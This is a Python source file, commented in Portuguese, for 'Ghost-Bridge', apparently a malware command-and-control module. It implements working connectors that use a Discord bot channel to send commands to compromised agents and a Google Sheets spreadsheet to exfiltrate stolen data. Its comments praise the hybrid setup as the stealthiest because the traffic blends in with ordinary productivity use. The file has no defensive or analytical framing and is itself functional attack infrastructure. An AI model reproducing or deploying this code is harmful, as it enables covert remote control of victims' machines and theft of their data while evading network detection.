"""
Ghost-Bridge - Conectores C2
Implementa comunicação via APIs legítimas (Discord, Google Sheets).
"""
import time
import random
import json
import os
import config

# ==========================================
# INTERFACE BASE
# ==========================================
class C2Connector:
    """Interface base para conectores C2."""
    def get_commands(self):
        """(Agente) Busca comandos pendentes."""
        raise NotImplementedError
    
    def post_command(self, cmd):
        """(Controlador) Posta um comando."""
        raise NotImplementedError
    
    def send_result(self, command_id, result_data):
        """(Agente) Envia resultado de um comando."""
        raise NotImplementedError
    
    def get_results(self):
        """(Controlador) Busca resultados."""
        raise NotImplementedError


# ==========================================
# MOCK CONNECTOR (Desenvolvimento)
# ==========================================
class MockConnector(C2Connector):
    """
    Simula a nuvem usando um arquivo JSON local ('mock_cloud.json').
    Permite que o Agente e o Controlador troquem dados em processos diferentes.
    """
    DB_FILE = "mock_cloud.json"

    def __init__(self):
        print("[*] MockConnector inicializado. Usando 'mock_cloud.json' como nuvem.")
        self._init_db()

    def _init_db(self):
        if not os.path.exists(self.DB_FILE):
            self._save_db({"commands": [], "results": []})

    def _load_db(self):
        try:
            with open(self.DB_FILE, 'r') as f:
                return json.load(f)
        except:
            return {"commands": [], "results": []}

    def _save_db(self, data):
        with open(self.DB_FILE, 'w') as f:
            json.dump(data, f, indent=4)

    def post_command(self, cmd):
        """(Controlador) Posta um comando na fila."""
        db = self._load_db()
        cmd_id = str(int(time.time()))
        
        new_cmd = {"id": cmd_id, "cmd": cmd, "status": "PENDING"}
        db["commands"].append(new_cmd)
        self._save_db(db)
        
        print(f"[C2] Postando comando simulado (ID: {cmd_id})")
        return cmd_id

    def get_commands(self):
        """(Agente) Busca comandos pendentes."""
        time.sleep(0.5)  # Simula delay de rede
        
        db = self._load_db()
        pending = []
        
        for c in db["commands"]:
            if c["status"] == "PENDING":
                c["status"] = "READ"
                pending.append(c)
        
        if pending:
            self._save_db(db)
            
        return pending

    def send_result(self, command_id, result_data):
        """(Agente) Envia o resultado."""
        print(f"[AGENTE] Enviando resultado para comando {command_id}...")
        
        db = self._load_db()
        db["results"].append({
            "timestamp": time.time(),
            "command_id": command_id,
            "data": result_data
        })
        self._save_db(db)
        print(f"[NUVEM] Resultado salvo no 'Google Sheets' simulado.")

    def get_results(self):
        """(Controlador) Lê os resultados."""
        db = self._load_db()
        return db["results"]


# ==========================================
# DISCORD CONNECTOR (Downlink - Comandos)
# ==========================================
class DiscordConnector(C2Connector):
    """
    Usa Discord como canal de comando (Downlink).
    - Controlador posta mensagens no canal
    - Agente lê mensagens do canal
    
    Requer: DISCORD_BOT_TOKEN e DISCORD_CHANNEL_ID no .env
    """
    
    def __init__(self):
        import requests
        self.requests = requests
        self.token = config.DISCORD_BOT_TOKEN
        self.channel_id = config.DISCORD_CHANNEL_ID
        self.base_url = "https://discord.com/api/v10"
        self.headers = {
            "Authorization": f"Bot {self.token}",
            "Content-Type": "application/json"
        }
        self.last_message_id = None  # Para paginação
        
        # Google Sheets para uplink (resultados)
        self.sheets_connector = GoogleSheetsConnector() if config.GOOGLE_CREDENTIALS_FILE else None
        
        print("[*] DiscordConnector inicializado.")
        
    def _send_message(self, content):
        """Envia mensagem para o canal Discord."""
        url = f"{self.base_url}/channels/{self.channel_id}/messages"
        payload = {"content": content}
        
        response = self.requests.post(url, headers=self.headers, json=payload)
        
        if response.status_code == 200:
            return response.json()
        else:
            print(f"[!] Erro ao enviar mensagem: {response.status_code} - {response.text}")
            return None
    
    def _get_messages(self, limit=10):
        """Busca mensagens do canal Discord."""
        url = f"{self.base_url}/channels/{self.channel_id}/messages?limit={limit}"
        
        if self.last_message_id:
            url += f"&after={self.last_message_id}"
        
        response = self.requests.get(url, headers=self.headers)
        
        if response.status_code == 200:
            return response.json()
        else:
            print(f"[!] Erro ao buscar mensagens: {response.status_code}")
            return []
    
    def post_command(self, cmd):
        """(Controlador) Posta comando no Discord."""
        cmd_id = str(int(time.time()))
        
        # Formato: CMD|<id>|<payload_criptografado>
        message_content = f"CMD|{cmd_id}|{cmd}"
        
        result = self._send_message(message_content)
        if result:
            print(f"[C2] Comando postado no Discord (ID: {cmd_id})")
            return cmd_id
        return None

    def get_commands(self):
        """(Agente) Busca comandos pendentes no Discord."""
        messages = self._get_messages()
        commands = []
        
        for msg in reversed(messages):  # Ordem cronológica
            content = msg.get("content", "")
            
            # Verifica se é um comando válido
            if content.startswith("CMD|"):
                parts = content.split("|", 2)
                if len(parts) == 3:
                    cmd_id, encrypted_cmd = parts[1], parts[2]
                    commands.append({
                        "id": cmd_id,
                        "cmd": encrypted_cmd
                    })
                    
                    # Atualiza último ID lido
                    self.last_message_id = msg["id"]
        
        return commands

    def send_result(self, command_id, result_data):
        """(Agente) Envia resultado via Google Sheets (ou Discord se não tiver Sheets)."""
        if self.sheets_connector:
            self.sheets_connector.send_result(command_id, result_data)
        else:
            # Fallback: Envia pelo próprio Discord (menos stealth)
            self._send_message(f"RES|{command_id}|{result_data}")
            print(f"[!] Resultado enviado via Discord (fallback)")

    def get_results(self):
        """(Controlador) Busca resultados do Google Sheets."""
        if self.sheets_connector:
            return self.sheets_connector.get_results()
        else:
            # Fallback: Busca no Discord
            messages = self._get_messages(limit=50)
            results = []
            
            for msg in messages:
                content = msg.get("content", "")
                if content.startswith("RES|"):
                    parts = content.split("|", 2)
                    if len(parts) == 3:
                        results.append({
                            "timestamp": msg.get("timestamp"),
                            "command_id": parts[1],
                            "data": parts[2]
                        })
            
            return results


# ==========================================
# GOOGLE SHEETS CONNECTOR (Uplink - Exfiltração)
# ==========================================
class GoogleSheetsConnector(C2Connector):
    """
    Usa Google Sheets como canal de exfiltração (Uplink).
    - Agente adiciona linhas com dados roubados
    - Controlador lê a planilha
    
    Requer: GOOGLE_CREDENTIALS_FILE e GOOGLE_SHEET_NAME no .env
    """
    
    def __init__(self):
        import gspread
        from google.oauth2.service_account import Credentials
        
        self.gspread = gspread
        
        # Escopos necessários
        scopes = [
            "https://www.googleapis.com/auth/spreadsheets",
            "https://www.googleapis.com/auth/drive"
        ]
        
        # Carrega credenciais
        creds_file = config.GOOGLE_CREDENTIALS_FILE
        if not os.path.exists(creds_file):
            raise FileNotFoundError(f"[!] Arquivo de credenciais não encontrado: {creds_file}")
        
        creds = Credentials.from_service_account_file(creds_file, scopes=scopes)
        self.client = gspread.authorize(creds)
        
        # Abre ou cria a planilha
        self.sheet_name = config.GOOGLE_SHEET_NAME
        self.sheet = self._get_or_create_sheet()
        
        print(f"[*] GoogleSheetsConnector inicializado. Planilha: {self.sheet_name}")
    
    def _get_or_create_sheet(self):
        """Abre a planilha existente ou cria uma nova."""
        try:
            return self.client.open(self.sheet_name).sheet1
        except self.gspread.exceptions.SpreadsheetNotFound:
            print(f"[*] Criando nova planilha: {self.sheet_name}")
            spreadsheet = self.client.create(self.sheet_name)
            
            # Adiciona cabeçalho
            sheet = spreadsheet.sheet1
            sheet.append_row(["Timestamp", "Command_ID", "Data"])
            
            return sheet
    
    def post_command(self, cmd):
        """
        Google Sheets não é usado para comandos (apenas uplink).
        Use DiscordConnector para downlink.
        """
        raise NotImplementedError("Google Sheets é apenas para Uplink (exfiltração)")

    def get_commands(self):
        """Google Sheets não é usado para comandos."""
        raise NotImplementedError("Google Sheets é apenas para Uplink (exfiltração)")

    def send_result(self, command_id, result_data):
        """(Agente) Adiciona resultado como nova linha na planilha."""
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        
        # Trunca dados muito longos (limite de célula do Sheets)
        max_len = 50000  # ~50KB por célula
        if len(result_data) > max_len:
            result_data = result_data[:max_len] + "...[TRUNCATED]"
        
        self.sheet.append_row([timestamp, command_id, result_data])
        print(f"[NUVEM] Resultado exfiltrado para Google Sheets (Cmd: {command_id})")

    def get_results(self):
        """(Controlador) Lê todos os resultados da planilha."""
        records = self.sheet.get_all_records()
        
        results = []
        for row in records:
            results.append({
                "timestamp": row.get("Timestamp", ""),
                "command_id": str(row.get("Command_ID", "")),
                "data": row.get("Data", "")
            })
        
        return results


# ==========================================
# HYBRID CONNECTOR (Combina Discord + Sheets)
# ==========================================
class HybridConnector(C2Connector):
    """
    Conector híbrido que usa:
    - Discord para Downlink (receber comandos)
    - Google Sheets para Uplink (exfiltrar dados)
    
    Essa é a configuração mais stealth, pois:
    - Comandos vêm de uma plataforma de comunicação comum
    - Dados saem disfarçados como tráfego de produtividade
    """
    
    def __init__(self):
        self.discord = DiscordConnector()
        
        # Discord já inicializa o GoogleSheetsConnector internamente
        print("[*] HybridConnector inicializado (Discord + Google Sheets)")
    
    def post_command(self, cmd):
        return self.discord.post_command(cmd)
    
    def get_commands(self):
        return self.discord.get_commands()
    
    def send_result(self, command_id, result_data):
        return self.discord.send_result(command_id, result_data)
    
    def get_results(self):
        return self.discord.get_results()


# ==========================================
# FÁBRICA DE CONECTORES
# ==========================================
def get_connector():
    """
    Retorna o conector apropriado baseado no modo de operação.
    
    Lógica:
    - MOCK: Usa MockConnector (JSON local)
    - REAL: Usa HybridConnector (Discord + Google Sheets)
    """
    mode = config.OPERATION_MODE.upper()
    
    if mode == 'MOCK':
        return MockConnector()
    
    elif mode == 'REAL':
        # Verifica qual combinação de APIs está disponível
        has_discord = bool(config.DISCORD_BOT_TOKEN and config.DISCORD_CHANNEL_ID)
        has_sheets = os.path.exists(config.GOOGLE_CREDENTIALS_FILE)
        
        if has_discord and has_sheets:
            return HybridConnector()
        elif has_discord:
            print("[!] Aviso: Google Sheets não configurado. Usando apenas Discord.")
            return DiscordConnector()
        else:
            raise ValueError(
                "[!] Modo REAL requer pelo menos DISCORD configurado.\n"
                "    Configure DISCORD_BOT_TOKEN e DISCORD_CHANNEL_ID no .env"
            )
    
    else:
        raise ValueError(f"[!] Modo de operação inválido: {mode}")
